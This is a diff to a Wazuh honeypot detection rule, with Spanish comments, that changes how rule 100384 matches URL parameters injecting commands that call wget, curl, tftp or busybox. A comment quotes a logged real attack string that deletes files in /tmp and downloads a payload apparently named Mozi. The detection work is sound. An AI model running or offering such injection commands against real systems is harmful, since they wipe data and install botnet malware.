@@ -89,10 +89,13 @@
        un descargador (wget, curl, tftp...). Caso real del 25/11: /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://.../Mozi.x
        (el nombre del archivo dice Mozi; que sea esa botnet es lectura mia). Va DESPUES de 100380 a proposito:
        entre hermanas gana la primera que coincide, asi el exploit de Netgear sigue cayendo en 100380 (mas especifica).
-       Limite: solo mira el parametro en la URL, no el cuerpo de un POST. -->
+       Limite: solo mira el parametro en la URL, no el cuerpo de un POST.
+       El & se escribe \x26 a proposito. La primera version con &amp; fallo en logtest del manager el 25/11 aunque pasaba
+       el modelo offline del CI; mi hipotesis es que el parser de Wazuh no decodifica &amp; dentro de la clase de
+       caracteres (sin verificar). \x26 funciona en los dos casos. -->
   <rule id="100384" level="8">
     <if_sid>100340</if_sid>
-    <field name="path" type="pcre2">(?i)[?&amp;](cmd|command|exec|shell)=[^&amp;\s]*(wget|curl|tftp|ftpget|busybox)\b</field>
+    <field name="path" type="pcre2">(?i)[?\x26](cmd|command|exec|shell)=[^\x26\s]*(wget|curl|tftp|ftpget|busybox)\b</field>
     <description>Honeypot: inyeccion de comando con descarga en un parametro de la URL ($(path)) desde $(ip).</description>
     <mitre><id>T1190</id></mitre>
   </rule>
